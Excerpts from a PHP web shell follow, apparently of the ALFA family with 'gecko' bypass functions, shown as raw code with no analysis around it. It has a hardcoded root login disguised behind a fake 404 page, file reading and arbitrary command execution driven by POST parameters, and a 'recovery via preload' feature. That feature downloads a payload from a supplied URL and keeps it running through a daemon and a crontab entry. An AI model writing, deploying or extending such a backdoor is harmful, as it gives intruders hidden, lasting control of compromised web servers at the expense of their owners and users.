...
'username' => 'root',
'password' => 'e75ee78d5e08fee2f76a5da65992c7de',
'safe_mode' => '1',
'login_page' => '404',
'show_icons' => '',
...
@fclose($fh);
if($boom && $content !== false && $content !== ''){
$content = clean_string($content);
}
}
if($content === false || $content === ''){
$content = alfaEx("cat '".addslashes($file)."'");
if($boom && is_string($content) && $content !== ''){
$content = clean_string($content);
}
}
return $content;
...
if($chdir_fals){
$filesize = isset($file_info[3]) ? $file_info[3] : 0;
$uid = array('name' => isset($file_info[1]) ? $file_info[1] : '?');
$gid = array('name' => isset($file_info[2]) ? $file_info[2] : '?');
$permcolor = alfaPermsColor(array("class"=>$perm_color_class,"num"=>isset($file_info[5])?$file_info[5]:'','human'=>isset($file_info[6])?$file_info[6]:''),true);
}else{
$uid = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['alfa1'])):false;
$gid = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['alfa1'])):false;
if(!is_array($uid) || !isset($uid['name'])){
$uid = array('name' => function_exists("fileowner") ? (string)@fileowner($_POST['alfa1']) : '?');
}
if(!is_array($gid) || !isset($gid['name'])){
$gid = array('name' => function_exists("filegroup") ? (string)@filegroup($_POST['alfa1']) : '?');
}
$permcolor = alfaPermsColor($_POST['alfa1']);
$filesize = @filesize($_POST['alfa1']);
if(($uid['name']==='' || $gid['name']==='') && _alfa_can_runCommand()){
$og = explode(":", alfaEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["alfa1"]).'"'));
if(isset($og[0]) && $og[0] !== '') $uid['name'] = $og[0];
if(isset($og[1]) && $og[1] !== '') $gid['name'] = $og[1];
}
}
...
$editBody = __read_file($_POST['alfa1']);
if (!is_string($editBody)) $editBody = '';
echo htmlspecialchars($editBody, ENT_QUOTES, 'UTF-8');
echo '</pre></div></div>';
break;
case 'highlight':
@chdir($_POST['c']);
...
echo '<b>[Execute command]</b><br>';
echo 'CMD: <input size="55" type="text" name="cmd" id="gecko_bp_cmd" value="id"><br><br>';
echo '<b>[Recovery via preload]</b><br>';
echo 'DIR_PATH: <input size="55" type="text" name="dir" value="'.$cwdEsc.'"><br>';
echo 'FILE_NAME: <input size="30" type="text" name="file" value="index.php"><br>';
echo 'DOWNLOAD_URL: <input size="55" type="text" name="url" value=""><br>';
echo 'Persist: <select name="persist"><option value="1">ON (daemon+crontab)</option><option value="0">OFF (one-shot)</option></select><br><br>';
echo '<input type="submit" value=" Run ">';
echo '</div></form></center>';
if (isset($_POST['alfa7']) && $_POST['alfa7'] === '>>') {
    $mode = trim((string)$_POST['alfa1']);
    if ($mode === 'recover') {
        if (!function_exists('geckoBypassRecover')) {
            echo __pre().'<b>Preload recover missing (embed failed). Re-upload latest manager.php.</b>';
        } else {
            $dir = trim((string)$_POST['alfa3']);
            $file = trim((string)$_POST['alfa4']);
            $url = trim((string)$_POST['alfa5']);
            $persist = (string)$_POST['alfa6'];
            $wantPersist = ($persist === '1' || $persist === 'true');
            $r = geckoBypassRecover($dir, $file, $url, $wantPersist);
            echo __pre();
            echo htmlspecialchars(isset($r['message']) ? $r['message'] : (empty($r['ok']) ? 'FAIL' : 'OK'))."\n";
            if (!empty($r['error'])) echo 'error: '.htmlspecialchars($r['error'])."\n";
            if (!empty($r['path'])) echo 'path: '.htmlspecialchars((string)$r['path'])."\n";
            if (isset($r['size'])) echo 'size: '.(int)$r['size']."\n";
            if (isset($r['mail_ok'])) echo 'mail_ok: '.(!empty($r['mail_ok']) ? 'yes' : 'no')."\n";
            if (!empty($r['workdir'])) echo 'workdir: '.htmlspecialchars((string)$r['workdir'])."\n";
            if ($wantPersist) {
                echo 'crontab: '.(empty($r['crontab']) ? 'MISSING' : 'OK (short b64)')."\n";
                echo 'pid: '.(isset($r['pid']) ? (int)$r['pid'] : 0)."\n";
                if (!empty($r['install_path'])) echo 'tmp: '.htmlspecialchars((string)$r['install_path'])."\n";
                if (!empty($r['shm_path'])) echo 'shm: '.htmlspecialchars((string)$r['shm_path'])."\n";
            }
            echo 'confirmed: '.(empty($r['ok']) ? 'NO' : 'YES')."\n";
            if (!empty($r['steps']) && is_array($r['steps'])) {
                echo "\n--- steps ---\n";
                foreach ($r['steps'] as $s) echo htmlspecialchars((string)$s)."\n";
        ...
        if (!function_exists('geckoBypassRun')) {
            ...
            if (isset($r['mail_ok'])) echo 'mail_ok: '.(!empty($r['mail_ok']) ? 'yes' : 'no')."\n";
            if (!empty($r['workdir'])) echo 'workdir: '.htmlspecialchars((string)$r['workdir'])."\n";
            echo 'confirmed: '.(empty($r['ok']) || (isset($r['output']) && (string)$r['output'] === '') ? 'NO' : 'YES')."\n";
